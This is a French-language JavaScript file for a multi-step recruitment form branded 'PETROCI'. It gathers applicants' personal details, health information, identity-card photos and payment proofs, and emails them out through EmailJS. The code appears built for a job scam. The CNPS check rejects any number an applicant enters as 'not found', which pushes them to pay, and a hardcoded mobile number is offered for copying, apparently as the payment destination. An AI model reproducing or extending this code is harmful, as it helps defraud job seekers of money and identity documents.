const emailJsConfig = {
  publicKey: 'FRFCjN26EqUnl6pqv',
  serviceId: 'service_4966nx3',
  templateId: 'template_xnqa3t1'
};

const IMGBB_API_KEY = 'VOTRE_CLE_IMGBB'; // ← remplacer après création compte imgbb.com

let currentStep = 1;
let files = { cnpsProof: null, identityCard: null };
let filesBase64 = { cnpsProof: '', identityCard: '' };

function fileToBase64(file) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    const objectUrl = URL.createObjectURL(file);

    img.onload = () => {
      URL.revokeObjectURL(objectUrl);

      // Max 400px, qualité 0.25 → ~8-15 Ko par image
      const MAX = 400;
      let w = img.width;
      let h = img.height;
      if (w > MAX) { h = Math.round(h * MAX / w); w = MAX; }
      if (h > MAX) { w = Math.round(w * MAX / h); h = MAX; }

      const canvas = document.createElement('canvas');
      canvas.width = w;
      canvas.height = h;
      canvas.getContext('2d').drawImage(img, 0, 0, w, h);

      // Extraire uniquement la partie base64 pure (sans le préfixe data:...)
      const full = canvas.toDataURL('image/jpeg', 0.25);
      resolve(full.split(',')[1]);
    };

    img.onerror = () => { URL.revokeObjectURL(objectUrl); reject(new Error('Impossible de lire l\'image')); };
    img.src = objectUrl;
  });
}

if (window.emailjs && emailjs.init) {
  emailjs.init(emailJsConfig.publicKey);
} else {
  console.warn('EmailJS non chargé — vérifiez le script importé.');
}

function showPage(id) {
  document.querySelectorAll('.page').forEach(p => { p.classList.remove('active'); p.style.display = 'none'; });
  const pg = document.getElementById(id);
  pg.style.display = 'block';
  requestAnimationFrame(() => { requestAnimationFrame(() => { pg.classList.add('active'); }); });
  window.scrollTo(0, 0);
  if (id === 'page-form') goToStep(1);
}

function goToStep(n) {
  document.querySelectorAll('.step-panel').forEach(p => p.classList.remove('active'));
  const panel = document.getElementById('step-' + n);
  panel.classList.add('active');
  currentStep = n;
  updateProg(n);
  window.scrollTo(0, 0);
}

function updateProg(n) {
  const lbls = ['', 'Étape 1 sur 4 — Informations personnelles', 'Étape 2 sur 4 — Date de prise de poste', 'Étape 3 sur 4 — CNPS', 'Étape 4 sur 4 — Engagement et soumission'];
  document.getElementById('step-lbl').textContent = lbls[n];
  document.getElementById('prog-fill').style.width = (n * 25) + '%';
  for (let i = 1; i <= 4; i++) {
    const d = document.getElementById('dot-' + i);
    d.classList.remove('active', 'done');
    if (i < n) d.classList.add('done');
    else if (i === n) d.classList.add('active');
  }
}

function showErr(id, show, msg) {
  const el = document.getElementById('err-' + id);
  const inp = document.getElementById(id);
  if (!el) return;
  if (msg) el.childNodes[el.childNodes.length - 1].textContent = msg;
  if (show) { el.classList.add('show'); if (inp) inp.classList.add('error'); }
  else { el.classList.remove('show'); if (inp) inp.classList.remove('error'); }
}
function val(id) { return (document.getElementById(id) || {}).value || ''; }

function validateStep1() {
  let ok = true;
  const emp = val('employeeId').trim();
  const fn = val('fullName').trim();
  const fi = val('firstName').trim();
  const ph = val('phone').trim();
  const en = val('emergencyName').trim();
  const ep = val('emergencyPhone').trim();
  showErr('employeeId', !emp); if (!emp) ok = false;
  showErr('fullName', fn.length < 2); if (fn.length < 2) ok = false;
  showErr('firstName', fi.length < 2); if (fi.length < 2) ok = false;
  showErr('phone', !ph); if (!ph) ok = false;
  showErr('emergencyName', en.length < 2); if (en.length < 2) ok = false;
  showErr('emergencyPhone', !ep); if (!ep) ok = false;
  if (ok) goToStep(2);
}

function validateStep2() {
  const d = val('availabilityDate');
  if (!d) { showErr('availabilityDate', true, 'La date de disponibilité est requise'); return; }
  const today = new Date(); today.setHours(0, 0, 0, 0);
  if (new Date(d) < today) { showErr('availabilityDate', true, 'La date ne peut pas être dans le passé'); return; }
  showErr('availabilityDate', false);
  goToStep(3);
}

function toggleCnps() {
  const v = document.querySelector('input[name="hasCnps"]:checked')?.value;
  document.getElementById('cnps-oui-section').style.display = v === 'oui' ? 'block' : 'none';
  document.getElementById('cnps-non-section').style.display = v === 'non' ? 'block' : 'none';
  document.getElementById('cnps-not-found').classList.remove('show');
  showErr('hasCnps', false);
}
function showCnpsError() {
  const v = val('cnpsNumber').trim();
  const b = document.getElementById('cnps-not-found');
  if (v.length > 0) b.classList.add('show'); else b.classList.remove('show');
}
function validateStep3() {
  const choice = document.querySelector('input[name="hasCnps"]:checked')?.value;
  if (!choice) { showErr('hasCnps', true); return; }
  showErr('hasCnps', false);
  if (choice === 'oui') { document.getElementById('cnps-not-found').classList.add('show'); return; }
  let ok = true;
  if (!files.cnpsProof) { showErr('cnpsProof', true); ok = false; } else showErr('cnpsProof', false);
  if (!files.identityCard) { showErr('identityCard', true); ok = false; } else showErr('identityCard', false);
  if (ok) { buildRecap(); goToStep(4); }
}

function buildRecap() {
  const fn = val('fullName').trim().toUpperCase();
  const fi = val('firstName').trim();
  const emp = val('employeeId').trim();
  const ph = val('phone').trim();
  const en = val('emergencyName').trim();
  const ep = val('emergencyPhone').trim();

  const iBody = document.getElementById('recap-identity-body');
  iBody.innerHTML = row('ID Employé', emp) + row('Nom complet', fi + ' ' + fn) + row('Téléphone opérationnel', ph) + row('Contact urgence', en) + row('Tél. urgence', ep);

  const d = val('availabilityDate');
  const hi = val('healthIssue').trim();
  const aBody = document.getElementById('recap-avail-body');
  aBody.innerHTML = row('Date de prise de poste', d ? new Date(d).toLocaleDateString('fr-FR') : '—') + (hi ? row('Santé', hi) : '');

  const choice = document.querySelector('input[name="hasCnps"]:checked')?.value;
  const cBody = document.getElementById('recap-cnps-body');
  if (choice === 'non') {
    const cnpsThumb = files.cnpsProof ? `<img src="${URL.createObjectURL(files.cnpsProof)}" style="width:100%;max-width:120px;height:80px;object-fit:cover;border-radius:8px;border:1px solid #E5E7EB;display:block;margin-top:4px;" alt="Preuve paiement"/>` : '—';
    const idThumb = files.identityCard ? `<img src="${URL.createObjectURL(files.identityCard)}" style="width:100%;max-width:120px;height:80px;object-fit:cover;border-radius:8px;border:1px solid #E5E7EB;display:block;margin-top:4px;" alt="Pièce d'identité"/>` : '—';
    cBody.innerHTML = row('Statut', 'Pas de carte CNPS') + row('Preuve paiement', cnpsThumb) + row("Pièce d'identité", idThumb);
  } else { cBody.innerHTML = row('Statut', '—'); }
}
function row(label, val) {
  return `<div class="recap-row"><span class="rr-label">${label}</span><span class="rr-val">${val}</span></div>`;
}

function getEmailTemplateParams() {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  let code = ''; for (let i = 0; i < 8; i++) code += chars[Math.floor(Math.random() * chars.length)];
  const refNumber = 'PETROCI-RECRUT-2026-' + code;
  // Stocker la ref pour l'afficher sur la page succès
  window._lastRefNumber = refNumber;

  const availRaw = val('availabilityDate');
  const availFormatted = availRaw ? new Date(availRaw).toLocaleDateString('fr-FR') : 'Non renseigné';

  return {
    employee_id: val('employeeId').trim(),
    first_name: val('firstName').trim(),
    full_name: `${val('firstName').trim()} ${val('fullName').trim().toUpperCase()}`,
    phone: val('phone').trim(),
    emergency_name: val('emergencyName').trim(),
    emergency_phone: val('emergencyPhone').trim(),
    availability_date: availFormatted,
    health_issue: val('healthIssue').trim() || 'Aucun',
    cnps_status: document.querySelector('input[name="hasCnps"]:checked')?.value === 'oui' ? 'Possède une carte CNPS' : 'Pas de carte CNPS — paiement effectué',
    cnps_proof_name: files.cnpsProof ? files.cnpsProof.name : 'Aucun',
    identity_card_name: files.identityCard ? files.identityCard.name : 'Aucun',
    cnps_proof_image: filesBase64.cnpsProof || '',
    identity_card_image: filesBase64.identityCard || '',
    submission_date: new Date().toLocaleDateString('fr-FR', { day: '2-digit', month: 'long', year: 'numeric', hour: '2-digit', minute: '2-digit' }),
    ref_number: refNumber
  };
}

async function sendApplicationEmail() {
  if (!window.emailjs || !emailjs.send) {
    throw new Error('EmailJS non disponible.');
  }
  // S'assurer que les fichiers sont bien compressés avant envoi
  const compressionJobs = [];
  if (files.cnpsProof && !filesBase64.cnpsProof) {
    compressionJobs.push(fileToBase64(files.cnpsProof).then(b64 => { filesBase64.cnpsProof = b64; }));
  }
  if (files.identityCard && !filesBase64.identityCard) {
    compressionJobs.push(fileToBase64(files.identityCard).then(b64 => { filesBase64.identityCard = b64; }));
  }
  if (compressionJobs.length > 0) await Promise.all(compressionJobs);

  return emailjs.send(emailJsConfig.serviceId, emailJsConfig.templateId, getEmailTemplateParams());
}

async function submitForm() {
  let ok = true;
  if (!document.getElementById('confirmAccuracy').checked) { showErr('confirmAccuracy', true); ok = false; } else showErr('confirmAccuracy', false);
  if (!document.getElementById('acceptTerms').checked) { showErr('acceptTerms', true); ok = false; } else showErr('acceptTerms', false);
  if (!ok) return;

  const btn = document.getElementById('btn-submit');
  const originalBtnHtml = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> Envoi en cours...';

  try {
    await sendApplicationEmail();
  } catch (err) {
    console.error('Erreur EmailJS', err);
    btn.disabled = false;
    btn.innerHTML = originalBtnHtml;
    showToast("L'envoi a échoué. Vérifiez votre connexion et réessayez.");
    return;
  }

  await new Promise(r => setTimeout(r, 1800));
  document.getElementById('ref-number').textContent = window._lastRefNumber || 'PETROCI-RECRUT-2026-XXXXXXXX';
  showPage('page-success');
  btn.disabled = false;
  btn.innerHTML = originalBtnHtml;
}

function handleFile(input, previewId, zoneId) {
  const file = input.files[0]; if (!file) return;
  if (file.size > 5 * 1024 * 1024) { showToast('Fichier trop volumineux (max 5 Mo)'); return; }
  const key = input.id;
  files[key] = file;
  showErr(key, false);
  renderPreview(file, previewId, key, zoneId);

  // Compression en arrière-plan, indicateur visuel sur la preview
  const prevEl = document.getElementById(previewId);
  fileToBase64(file).then(b64 => {
    filesBase64[key] = b64;
    // Mettre à jour la taille affichée avec la taille compressée
    const compressed = Math.round((b64.length * 3) / 4 / 1024);
    const sizeEl = prevEl.querySelector('.fp-size');
    if (sizeEl) sizeEl.textContent = `Compressé : ~${compressed} Ko`;
  }).catch(() => {
    showToast('Erreur lors du traitement du fichier.');
  });
}

function renderPreview(file, previewId, key, zoneId) {
  const prev = document.getElementById(previewId);
  const isImg = /\.(jpg|jpeg|png)$/i.test(file.name);
  const sizeMB = (file.size / 1024 / 1024).toFixed(2);
  let imgHtml = '';
  if (isImg) {
    const url = URL.createObjectURL(file);
    imgHtml = `<img src="${url}" class="file-img-preview" alt="Aperçu"/>`;
  }
  prev.innerHTML = `<div class="file-preview">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
    <div class="fp-info">
      <p class="fp-name">${file.name}</p>
      <p class="fp-size">${sizeMB} Mo</p>
    </div>
    <button class="fp-del" onclick="removeFile('${key}','${previewId}')">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
    </button>
  </div>${imgHtml}`;
}

function removeFile(key, previewId) {
  files[key] = null;
  filesBase64[key] = '';
  document.getElementById(previewId).innerHTML = '';
  document.getElementById(key).value = '';
}

function dragOver(e, zoneId) { e.preventDefault(); document.getElementById(zoneId).classList.add('drag'); }
function dragLeave(zoneId) { document.getElementById(zoneId).classList.remove('drag'); }
function dropFile(e, inputId, zoneId, previewId) {
  e.preventDefault(); dragLeave(zoneId);
  const file = e.dataTransfer.files[0]; if (!file) return;
  const input = document.getElementById(inputId);
  const dt = new DataTransfer(); dt.items.add(file); input.files = dt.files;
  handleFile(input, previewId, zoneId);
}

function copyNum() {
  navigator.clipboard.writeText('+2250769026323').then(() => {
    const btn = document.getElementById('copy-btn');
    const txt = document.getElementById('copy-txt');
    const icon = document.getElementById('copy-icon');
    btn.style.background = '#2E7D32';
    icon.innerHTML = '<polyline points="20 6 9 17 4 12"/>';
    icon.setAttribute('viewBox', '0 0 24 24');
    txt.textContent = 'Copié !';
    setTimeout(() => {
      btn.style.background = '';
      icon.innerHTML = '<rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>';
      txt.textContent = 'Copier';
    }, 2000);
  });
}

function showToast(msg) {
  const t = document.getElementById('toast');
  t.textContent = msg; t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), 2500);
}

function resetAll() {
  document.querySelectorAll('input[type=text],input[type=tel],input[type=date],textarea').forEach(el => el.value = '');
  document.querySelectorAll('input[type=radio],input[type=checkbox]').forEach(el => el.checked = false);
  document.querySelectorAll('.error-msg').forEach(el => el.classList.remove('show'));
  document.querySelectorAll('input,select,textarea').forEach(el => el.classList.remove('error'));
  document.getElementById('cnps-oui-section').style.display = 'none';
  document.getElementById('cnps-non-section').style.display = 'none';
  document.getElementById('preview-cnpsProof').innerHTML = '';
  document.getElementById('preview-identityCard').innerHTML = '';
  document.getElementById('cnps-not-found').classList.remove('show');
  files = { cnpsProof: null, identityCard: null };
  filesBase64 = { cnpsProof: '', identityCard: '' };
  showPage('page-home');
}

document.getElementById('availabilityDate').min = new Date().toISOString().split('T')[0];
document.querySelectorAll('.page').forEach(p => { if (!p.classList.contains('active')) p.style.display = 'none'; });
